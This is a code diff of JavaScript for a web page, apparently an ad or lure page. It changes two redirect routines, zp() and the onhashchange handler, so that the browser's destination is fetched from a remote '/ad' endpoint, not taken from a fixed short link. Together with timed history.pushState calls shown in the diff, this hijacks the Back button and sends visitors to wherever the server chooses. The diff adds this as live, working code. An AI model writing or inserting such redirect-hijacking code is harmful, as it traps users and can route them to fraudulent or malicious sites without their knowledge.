@@ -300,16 +300,16 @@ function hashChangeJump() {
 }
 
 function zp(){
-    window.location.href="https://dwz.cn/33r9W1EL";
-    // var httpRequest = new XMLHttpRequest();
-    // httpRequest.open('GET', 'https://s10.app1110258507.qqopenapp.com/160/ad', true);
-    // httpRequest.send();
-    // httpRequest.onreadystatechange = function () {
-    //     if (httpRequest.readyState == 4 && httpRequest.status == 200) {
-    //         var json = httpRequest.responseText;
-    //         window.location.href=json;
-    //     }
-    // };
+    // window.location.href="https://dwz.cn/33r9W1EL";
+    var httpRequest = new XMLHttpRequest();
+    httpRequest.open('GET', 'https://s10.app1110258507.qqopenapp.com/160/ad', true);
+    httpRequest.send();
+    httpRequest.onreadystatechange = function () {
+        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+            var json = httpRequest.responseText;
+            window.location.href=json;
+        }
+    };
 }
 var f=0;
 document.title=title[f];
@@ -349,14 +349,14 @@ setTimeout(function () {
     history.pushState(history.length + 1, "message", "#" + new Date().getTime());
 }, 200);
 window.onhashchange = function () {
-    window.location.href="https://dwz.cn/33r9W1EL";
-    // var httpRequest = new XMLHttpRequest();
-    // httpRequest.open('GET', 'https://s10.app1110258507.qqopenapp.com/160/ad/z', true);
-    // httpRequest.send();
-    // httpRequest.onreadystatechange = function () {
-    //     if (httpRequest.readyState == 4 && httpRequest.status == 200) {
-    //         var json = httpRequest.responseText;
-    //         window.location.href=json;
-    //     }
-    // };
+    // window.location.href="https://dwz.cn/33r9W1EL";
+    var httpRequest = new XMLHttpRequest();
+    httpRequest.open('GET', 'https://s10.app1110258507.qqopenapp.com/160/ad/z', true);
+    httpRequest.send();
+    httpRequest.onreadystatechange = function () {
+        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+            var json = httpRequest.responseText;
+            window.location.href=json;
+        }
+    };
 };
